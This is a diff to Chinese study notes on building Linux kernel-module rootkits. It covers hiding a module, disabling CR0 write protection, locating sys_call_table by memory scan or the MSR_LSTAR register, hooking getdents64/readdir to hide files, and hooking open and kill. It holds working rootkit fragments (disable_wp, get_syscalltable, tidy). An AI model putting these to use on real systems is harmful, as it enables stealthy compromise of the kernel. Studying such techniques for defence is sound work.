@@ -40,11 +40,47 @@ module_exit(mod_exit_func);
 
 >  `insmod`（安装 LKM），`rmmod` （删除 LKM），`modprobe`（`insmod` 和 `rmmod` 的包装器），`depmod`（用于创建模块依赖项），以及 `modinfo`（用于为模块宏查找值） 
 
+### LKM执行与结束
 
+从`LKM`的入口/出口函数说起。我们知道，既可以使用默认名称作为入口/出口函数名，也可以使用自己定义的名字。两种方法如下：
 
+默认名：
 
+```
+int init_module(void){...}
 
+void cleanup_module(void){...}
+```
 
+自定义名：
+
+```
+int test_init(void){...}
+void test_exit(void){...}
+
+module_init(test_init);
+module_exit(test_exit);
+```
+
+第一种方法比第二种少了`module_init/module_exit`的注册过程。我们猜想，这个注册过程把`test_init`与`init_module`做了某种联系。
+
+看一下源码`include/linux/module.h`:
+
+```
+/* Each module must use one module_init(). */
+#define module_init(initfn)					\
+	static inline initcall_t __inittest(void)		\
+	{ return initfn; }					\
+	int init_module(void) __attribute__((alias(#initfn)));
+
+/* This is only required if you want to be unloadable. */
+#define module_exit(exitfn)					\
+	static inline exitcall_t __exittest(void)		\
+	{ return exitfn; }					\
+	void cleanup_module(void) __attribute__((alias(#exitfn)));
+```
+
+上面的`alias`是 GCC 的拓展功能，给函数起别名并关联起来。所以最终被使用的还是`init_module/cleanup_module`这两个名字。
 
 ### 隐藏模块
 
@@ -62,7 +98,7 @@ module_exit(mod_exit_func);
 
 /proc/modules的内容是内核利用struct modules结构体的表头去遍历内核模块链表
 
-
+对于/sys/module下的隐藏需要操纵kobject的fd对象，具体实现请看代码
 
 
 
@@ -81,29 +117,124 @@ static inline unsigned long read_cr0(void);
 static inline void write_cr0(unsigned long x);
 ```
 
-关闭写保护
-
 ```
-void disable_write_protection(void)
+// ========== WRITE_PROTECTION HELPER ==========
+// TODO: Consider race condition on SMP systems.
+void
+disable_wp(void)
 {
-	unsigned long cr0 = read_cr0();
-	clear_bit(16, &cr0);
-	write_cr0(cr0);
+    unsigned long cr0;
+
+    preempt_disable();
+    cr0 = read_cr0();
+    clear_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+    preempt_enable();
+
+    return;
 }
-```
 
-开启写保护
 
-```
-void enable_write_protection(void)
+// TODO: Consider race condition on SMP systems.
+void
+enable_wp(void)
 {
-	unsigned long cr0 = read_cr0();
-	set_bit(16, &cr0);
-	write_cr0(cr0);
+    unsigned long cr0;
+
+    preempt_disable();
+    cr0 = read_cr0();
+    set_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+    preempt_enable();
+
+    return;
 }
+// ========== END WRITE_PROTECTION HELPER ==========
 ```
 
-> 在设置或者清除某个比特，我们使用了[set_bit](https://www.kernel.org/doc/htmldocs/kernel-api/API-set-bit.html)与[clear_bit](https://www.kernel.org/doc/htmldocs/kernel-api/API-clear-bit.html)。 它们是 Linux 内核提供给内核模块使用的编程接口，简单易懂，同时还免去了我们自己写那种很难读的位运算的痛苦。 
+
+
+
+
+### 获取sys_call_table地址
+
+#### 暴力搜索地址空间
+
+[参考](https://wohin.me/rootkit/2017/05/08/LinuxRootkitExp-0001.html)
+
+1. 内核内存空间的起始地址`PAGE_OFFSET`变量和`sys_close`系统调用对我们是可见的（`sys_open`/`sys_read`等并未导出）；
+2. 系统调用号（即`sys_call_table`中的元素下标）在同一`ABI`（x86与x64属于不同ABI）中是高度后向兼容的；这个系统调用号我们也是可以直接引用的（如`__NR_close`）。
+3. 所以我们可以从内核空间起始地址开始，把每一个指针大小的内存假设成`sys_call_table`的地址，并用`__NR_close`索引去访问它的成员，如果这个值与`sys_close`的地址相同的话，就可以认为找到了`sys_call_table`的地址 
+
+该方法有可能被欺骗。
+
+PAGE_OFFSET的定义
+
+[参考](http://www.kerneltravel.net/chenlj/lecture7.pdf)
+
+```
+#define PAGE_OFFSET		((unsigned long)__PAGE_OFFSET)
+#define __PAGE_OFFSET           page_offset_base
+unsigned long page_offset_base = __PAGE_OFFSET_BASE;
+EXPORT_SYMBOL(page_offset_base);
+#define __PAGE_OFFSET_BASE      _AC(0xffff880000000000, UL)
+```
+
+#### 通过某些寄存器来读取
+
+读取 `MSR_LSTAR` register来获取
+
+[参考](http://bw0x00.blogspot.de/2011/03/find-syscalltable-in-linux-26.html)
+
+```
+#ifndef SYSCALLTABLE_H
+#define SYSCALLTABLE_H
+
+#include <linux/types.h>
+#include <asm/msr-index.h>
+
+unsigned long **get_syscalltable(void);
+
+#endif
+
+
+/*
+ * from: http://bw0x00.blogspot.de/2011/03/find-syscalltable-in-linux-26.html
+ */
+unsigned long **get_syscalltable(void)
+{
+	int i, lo, hi;
+	unsigned char *ptr;
+	unsigned long system_call;
+
+	alert("GETTING SYS_CALL_TABLE");
+
+	/* http://wiki.osdev.org/Inline_Assembly/Examples#RDMSR */
+	asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
+	system_call = (unsigned long)(((long)hi << 32) | lo);
+
+	/* loop until first 3 bytes of instructions are found */
+	for (ptr = (unsigned char *)system_call, i = 0; i < 500; i++)  {
+		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
+			debug("SYS_CALL_TABLE FOUND");
+			/* set address together */
+			return (unsigned long **)(0xffffffff00000000 
+				| *((unsigned int *)(ptr + 3)));
+		}
+
+		ptr++;
+	}
+
+	debug("SYS_CALL_TABLE NOT FOUND");
+
+	return NULL;
+}
+
+```
+
+
+
+
 
 
 
@@ -615,6 +746,423 @@ struct proc_dir_entry {
 
 
 
+
+
+**getdents64**
+
+[参考](http://www.cppblog.com/momoxiao/archive/2010/04/04/111594.aspx)
+
+getdents64读取目录文件中的一个个目录项(directory entry)并返回 
+
+
+
+```
+/fs/readdir.c
+asmlinkage long sys_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count)
+{
+    struct file * file;
+    struct linux_dirent64 __user * lastdirent;
+    struct getdents_callback64 buf;
+    int error;
+
+    error = -EFAULT;
+    if (!access_ok(VERIFY_WRITE, dirent, count))
+        goto out;
+
+    error = -EBADF;
+    file = fget(fd);
+    if (!file)
+        goto out;
+
+    buf.current_dir = dirent;
+    buf.previous = NULL;
+    buf.count = count;
+    buf.error = 0;
+
+    error = vfs_readdir(file, filldir64, &buf); ///读取目录函数
+    if (error < 0)
+        goto out_putf;
+    error = buf.error;
+    lastdirent = buf.previous;
+    if (lastdirent) {
+        typeof(lastdirent->d_off) d_off = file->f_pos;
+        error = -EFAULT;
+        if (__put_user(d_off, &lastdirent->d_off))
+            goto out_putf;
+        error = count - buf.count;
+    }
+
+out_putf:
+    fput(file);
+out:
+    return error;
+}
+```
+
+ 在sys_getdents64中通过调用vfs_readdir()读取目录函数 
+
+```
+/fs/reddir.c
+int vfs_readdir(struct file *file, filldir_t filler, void *buf)
+{
+    struct inode *inode = file->f_path.dentry->d_inode;
+    int res = -ENOTDIR;
+    if (!file->f_op || !file->f_op->readdir)
+        goto out;
+
+    res = security_file_permission(file, MAY_READ);
+    if (res)
+        goto out;
+
+    res = mutex_lock_killable(&inode->i_mutex);
+    if (res)
+        goto out;
+
+    res = -ENOENT;
+    if (!IS_DEADDIR(inode)) {
+        res = file->f_op->readdir(file, buf, filler); ///调用实际文件系统的读取目录项(就是文件系统三层结构中最下面一层)
+        file_accessed(file);
+    }
+    mutex_unlock(&inode->i_mutex);
+out:
+    return res;
+}
+```
+
+ file结构里有个文件操作的函数集const struct file_operations *f_op。
+struct file_operations 中实际上是一些函数的指针，readdir就是其中的一个指针。
+在调用vir_readdir之前，内核会根据实际文件系统类型给struct file_operations赋对应值。 
+
+file结构如下：
+
+```
+/include/linux/fs.h
+struct file {
+    /*
+     * fu_list becomes invalid after file_free is called and queued via
+     * fu_rcuhead for RCU freeing
+     */
+    union {
+        struct list_head    fu_list;
+        struct rcu_head     fu_rcuhead;
+    } f_u;
+    struct path        f_path;
+#define f_dentry    f_path.dentry
+#define f_vfsmnt    f_path.mnt
+    const struct file_operations    *f_op; ///对应每一种实际的文件系统，会有自己的file_operations函数集。可以理解成file这个类的纯虚函数集
+    atomic_long_t        f_count;
+    unsigned int         f_flags;
+    mode_t            f_mode;
+    loff_t            f_pos;
+    struct fown_struct    f_owner;
+    unsigned int        f_uid, f_gid;
+    struct file_ra_state    f_ra;
+
+    u64            f_version;
+#ifdef CONFIG_SECURITY
+    void            *f_security;
+#endif
+    /* needed for tty driver, and maybe others */
+    void            *private_data;
+
+#ifdef CONFIG_EPOLL
+    /* Used by fs/eventpoll.c to link all the hooks to this file */
+    struct list_head    f_ep_links;
+    spinlock_t        f_ep_lock;
+#endif /* #ifdef CONFIG_EPOLL */
+    struct address_space    *f_mapping;
+#ifdef CONFIG_DEBUG_WRITECOUNT
+    unsigned long f_mnt_write_state;
+#endif
+};
+```
+
+ file_operations结构，里面是一些函数指针。我们在这儿关心的是int (*readdir) (struct file *, void *, filldir_t);
+readdir()用来读取实际文件系统目录项。 
+
+```
+struct file_operations {
+    struct module *owner;
+    loff_t (*llseek) (struct file *, loff_t, int);
+    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
+    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
+    ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
+    ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
+    int (*readdir) (struct file *, void *, filldir_t);  ///我们在这儿关心的函数指针，实际文件系统的读取目录项函数。
+                ///每次打开文件，内核都会根据文件位于的文件系统类型，对文件相应的file_operations赋相应值。
+    unsigned int (*poll) (struct file *, struct poll_table_struct *);
+    int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);
+    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
+    long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
+    int (*mmap) (struct file *, struct vm_area_struct *);
+    int (*open) (struct inode *, struct file *);
+    int (*flush) (struct file *, fl_owner_t id);
+    int (*release) (struct inode *, struct file *);
+    int (*fsync) (struct file *, struct dentry *, int datasync);
+    int (*aio_fsync) (struct kiocb *, int datasync);
+    int (*fasync) (int, struct file *, int);
+    int (*lock) (struct file *, int, struct file_lock *);
+    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
+    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
+    int (*check_flags)(int);
+    int (*dir_notify)(struct file *filp, unsigned long arg);
+    int (*flock) (struct file *, int, struct file_lock *);
+    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
+    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
+    int (*setlease)(struct file *, long, struct file_lock **);
+};
+```
+
+ 在ls用到file结构中的file_operations之前，内核是怎样它赋值的 
+
+```
+struct inode *ext2_iget (struct super_block *sb, unsigned long ino)
+{
+    struct ext2_inode_info *ei;
+    struct buffer_head * bh;
+    struct ext2_inode *raw_inode;
+    struct inode *inode;
+    long ret = -EIO;
+    int n;
+
+    inode = iget_locked(sb, ino);
+    if (!inode)
+        return ERR_PTR(-ENOMEM);
+    if (!(inode->i_state & I_NEW))
+        return inode;
+
+    ei = EXT2_I(inode);
+#ifdef CONFIG_EXT2_FS_POSIX_ACL
+    ei->i_acl = EXT2_ACL_NOT_CACHED;
+    ei->i_default_acl = EXT2_ACL_NOT_CACHED;
+#endif
+    ei->i_block_alloc_info = NULL;
+
+    raw_inode = ext2_get_inode(inode->i_sb, ino, &bh);
+    if (IS_ERR(raw_inode)) {
+        ret = PTR_ERR(raw_inode);
+         goto bad_inode;
+    }
+
+    inode->i_mode = le16_to_cpu(raw_inode->i_mode);
+    inode->i_uid = (uid_t)le16_to_cpu(raw_inode->i_uid_low);
+    inode->i_gid = (gid_t)le16_to_cpu(raw_inode->i_gid_low);
+    if (!(test_opt (inode->i_sb, NO_UID32))) {
+        inode->i_uid |= le16_to_cpu(raw_inode->i_uid_high) << 16;
+        inode->i_gid |= le16_to_cpu(raw_inode->i_gid_high) << 16;
+    }
+    inode->i_nlink = le16_to_cpu(raw_inode->i_links_count);
+    inode->i_size = le32_to_cpu(raw_inode->i_size);
+    inode->i_atime.tv_sec = (signed)le32_to_cpu(raw_inode->i_atime);
+    inode->i_ctime.tv_sec = (signed)le32_to_cpu(raw_inode->i_ctime);
+    inode->i_mtime.tv_sec = (signed)le32_to_cpu(raw_inode->i_mtime);
+    inode->i_atime.tv_nsec = inode->i_mtime.tv_nsec = inode->i_ctime.tv_nsec = 0;
+    ei->i_dtime = le32_to_cpu(raw_inode->i_dtime);
+    /* We now have enough fields to check if the inode was active or not.
+     * This is needed because nfsd might try to access dead inodes
+     * the test is that same one that e2fsck uses
+     * NeilBrown 1999oct15
+     */
+    if (inode->i_nlink == 0 && (inode->i_mode == 0 || ei->i_dtime)) {
+        /* this inode is deleted */
+        brelse (bh);
+        ret = -ESTALE;
+        goto bad_inode;
+    }
+    inode->i_blocks = le32_to_cpu(raw_inode->i_blocks);
+    ei->i_flags = le32_to_cpu(raw_inode->i_flags);
+    ei->i_faddr = le32_to_cpu(raw_inode->i_faddr);
+    ei->i_frag_no = raw_inode->i_frag;
+    ei->i_frag_size = raw_inode->i_fsize;
+    ei->i_file_acl = le32_to_cpu(raw_inode->i_file_acl);
+    ei->i_dir_acl = 0;
+    if (S_ISREG(inode->i_mode))
+        inode->i_size |= ((__u64)le32_to_cpu(raw_inode->i_size_high)) << 32;
+    else
+        ei->i_dir_acl = le32_to_cpu(raw_inode->i_dir_acl);
+    ei->i_dtime = 0;
+    inode->i_generation = le32_to_cpu(raw_inode->i_generation);
+    ei->i_state = 0;
+    ei->i_block_group = (ino - 1) / EXT2_INODES_PER_GROUP(inode->i_sb);
+    ei->i_dir_start_lookup = 0;
+
+    /*
+     * NOTE! The in-memory inode i_data array is in little-endian order
+     * even on big-endian machines: we do NOT byteswap the block numbers!
+     */
+    for (n = 0; n < EXT2_N_BLOCKS; n++)
+        ei->i_data[n] = raw_inode->i_block[n];
+///下面是我们关心的。。。。。。。。。。。。。。。。。。。。。。。。
+///这里对inode->fop赋值，就是inode中的file_operations结构。
+    if (S_ISREG(inode->i_mode)) {   ///普通文件(S_ISREG)，inode->i_fop为ext2_file_operations函数集
+        inode->i_op = &ext2_file_inode_operations;
+        if (ext2_use_xip(inode->i_sb)) {   ///???现在不关心
+            inode->i_mapping->a_ops = &ext2_aops_xip;
+            inode->i_fop = &ext2_xip_file_operations;
+        } else if (test_opt(inode->i_sb, NOBH)) {
+            inode->i_mapping->a_ops = &ext2_nobh_aops;
+            inode->i_fop = &ext2_file_operations;
+        } else {
+            inode->i_mapping->a_ops = &ext2_aops;
+            inode->i_fop = &ext2_file_operations;
+        }
+    } else if (S_ISDIR(inode->i_mode)) {   ///目录文件(S_ISDIR)，inode->i_fop为ext2_dir_operations函数集
+        inode->i_op = &ext2_dir_inode_operations;
+        inode->i_fop = &ext2_dir_operations;
+        if (test_opt(inode->i_sb, NOBH))
+            inode->i_mapping->a_ops = &ext2_nobh_aops;
+        else
+            inode->i_mapping->a_ops = &ext2_aops;
+    } else if (S_ISLNK(inode->i_mode)) {   ///链接文件(S_ISLNK)，不需要inode->i_fop函数集
+        if (ext2_inode_is_fast_symlink(inode))
+            inode->i_op = &ext2_fast_symlink_inode_operations;
+        else {
+            inode->i_op = &ext2_symlink_inode_operations;
+            if (test_opt(inode->i_sb, NOBH))
+                inode->i_mapping->a_ops = &ext2_nobh_aops;
+            else
+                inode->i_mapping->a_ops = &ext2_aops;
+        }
+    } else {
+        inode->i_op = &ext2_special_inode_operations;
+        if (raw_inode->i_block[0])
+            init_special_inode(inode, inode->i_mode,
+               old_decode_dev(le32_to_cpu(raw_inode->i_block[0])));
+        else
+            init_special_inode(inode, inode->i_mode,
+               new_decode_dev(le32_to_cpu(raw_inode->i_block[1])));
+    }
+    ///以上。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+    brelse (bh);
+    ext2_set_inode_flags(inode);
+    unlock_new_inode(inode);
+    return inode;
+
+bad_inode:
+    iget_failed(inode);
+    return ERR_PTR(ret);
+}
+```
+
+ 上面一段代码把inode中的file_operations赋值为ext2_file_operations。 
+
+ 打开文件用sys_open()，在fs/open.c文件中，函数调用流程如下：
+sys_open() --> do_sys_open() --> do_filp_open() --> nameidata_to_filp() --> __dentry_open() 
+
+```
+static struct file *__dentry_open(struct dentry *dentry, struct vfsmount *mnt,
+                    int flags, struct file *f,
+                    int (*open)(struct inode *, struct file *))
+{
+    struct inode *inode;
+    int error;
+
+    f->f_flags = flags;
+    f->f_mode = ((flags+1) & O_ACCMODE) | FMODE_LSEEK |
+                FMODE_PREAD | FMODE_PWRITE;
+    inode = dentry->d_inode;
+    if (f->f_mode & FMODE_WRITE) {
+        error = __get_file_write_access(inode, mnt);
+        if (error)
+            goto cleanup_file;
+        if (!special_file(inode->i_mode))
+            file_take_write(f);
+    }
+
+    f->f_mapping = inode->i_mapping;
+    f->f_path.dentry = dentry;
+    f->f_path.mnt = mnt;
+    f->f_pos = 0;
+    f->f_op = fops_get(inode->i_fop);   ///把inode中file_operations函数集给file中file_operations函数集
+    file_move(f, &inode->i_sb->s_files);
+
+    error = security_dentry_open(f);
+    if (error)
+        goto cleanup_all;
+
+    if (!open && f->f_op)
+        open = f->f_op->open;
+    if (open) {
+        error = open(inode, f);
+        if (error)
+            goto cleanup_all;
+    }
+
+    f->f_flags &= ~(O_CREAT | O_EXCL | O_NOCTTY | O_TRUNC);
+
+    file_ra_state_init(&f->f_ra, f->f_mapping->host->i_mapping);
+
+    /* NB: we're sure to have correct a_ops only after f_op->open */
+    if (f->f_flags & O_DIRECT) {
+        if (!f->f_mapping->a_ops ||
+            ((!f->f_mapping->a_ops->direct_IO) &&
+            (!f->f_mapping->a_ops->get_xip_mem))) {
+            fput(f);
+            f = ERR_PTR(-EINVAL);
+        }
+    }
+
+    return f;
+
+cleanup_all:
+    fops_put(f->f_op);
+    if (f->f_mode & FMODE_WRITE) {
+        put_write_access(inode);
+        if (!special_file(inode->i_mode)) {
+            /*
+             * We don't consider this a real
+             * mnt_want/drop_write() pair
+             * because it all happenend right
+             * here, so just reset the state.
+             */
+            file_reset_write(f);
+            mnt_drop_write(mnt);
+        }
+    }
+    file_kill(f);
+    f->f_path.dentry = NULL;
+    f->f_path.mnt = NULL;
+cleanup_file:
+    put_filp(f);
+    dput(dentry);
+    mntput(mnt);
+    return ERR_PTR(error);
+}
+```
+
+ 在这儿，f->f_op = fops_get(inode->i_fop); 把file结构中的file_operations函数集赋值成inode中的函数集，也就是ext2_file_operations。 
+
+ 下面归纳下ls执行的整个流程：
+假设当前目录在ext2文件系统上，ls要查看当前目录下的文件，
+1.open打开当前目录的句柄，这个句柄对应内核中一个file结构。
+  file结构中的file_operations函数集从inode结构中获得，就是ext2_file_operations
+2.getdents64调用file->f_op->readdir()实际上是调用了ext2_file_operations中的readdir()，
+  由ext2文件系统驱动读取当前目录下面的文件项。
+
+我们要隐藏一个文件，要做的就是替换file->f_op->readdir()，也就是替换ext2_file_operations中的readdir()。 
+
+
+
+**tidy()**
+
+```
+static inline void
+tidy(void)
+{
+//	kfree(THIS_MODULE->notes_attrs);
+//	THIS_MODULE->notes_attrs = NULL;
+	kfree(THIS_MODULE->sect_attrs);
+	THIS_MODULE->sect_attrs = NULL;
+//	kfree(THIS_MODULE->mkobj.mp);
+//	THIS_MODULE->mkobj.mp = NULL;
+//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
+//	kfree(THIS_MODULE->mkobj.drivers_dir);
+//	THIS_MODULE->mkobj.drivers_dir = NULL;
+}
+```
+
+
+
 ## Zeroevil库的使用
 
 
@@ -637,5 +1185,23 @@ enable_wp(void)     //开启写保护，需要上锁
 
 void
 print_process_list(void)  //打印进程列表
+```
+
+
+
+
+
+在hook open的时候需要注意内核态数据和用户态数据不能互通，hook kill函数是成功的，因为它直接传pid值给kill，而open传进来的filename是一个指针
+
+
+
+```
+static __always_inline unsigned long __must_check
+copy_from_user(void *to, const void __user *from, unsigned long n)
+{
+	if (likely(check_copy_size(to, n, false)))
+		n = _copy_from_user(to, from, n);
+	return n;
+}
 ```
 
